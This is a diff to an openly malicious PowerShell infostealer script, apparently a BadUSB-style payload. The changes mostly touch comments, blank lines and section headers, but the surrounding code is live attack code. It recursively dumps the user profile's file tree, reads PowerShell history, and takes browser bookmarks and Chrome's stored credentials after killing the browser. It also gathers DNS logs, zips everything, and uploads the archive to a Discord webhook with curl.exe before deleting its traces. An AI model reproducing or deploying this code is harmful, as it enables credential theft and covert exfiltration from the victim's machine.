@@ -36,7 +36,7 @@ New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
 ############################################################################################################################################################
 
-# Recon all User Directories TODO: re enable
+# Recon all User Directories
 tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
 
 # Powershell history
@@ -481,7 +481,7 @@ Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\$FolderName\B
 ############################################################################################################################################################
 
 
-#Stage 1 Obtain the credentials from the Chrome browsers User Data folder
+#Obtain the credentials from the Chrome browsers User Data folder
 
 #First we Kill Chrome just to be safe
 Stop-Process -Name Chrome
@@ -517,7 +517,7 @@ Start-Process -FilePath $pathToChrome
 
 ############################################################################################################################################################
 
-#Get dns logs
+#Get dns logs TODO: improve until works
 
 function Get-DnsRequests {
 
@@ -563,6 +563,32 @@ Get-DnsRequests >> $env:TMP\$FolderName\DnsRequests.txt
 
 ############################################################################################################################################################
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+############################################################################################################################################################
+
+#                                           COMPRESS
+
 Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
 
 ############################################################################################################################################################
@@ -593,6 +619,8 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
 
 ############################################################################################################################################################
+
+# CLEAR TRACES
 
 # Delete contents of Temp folder 
 
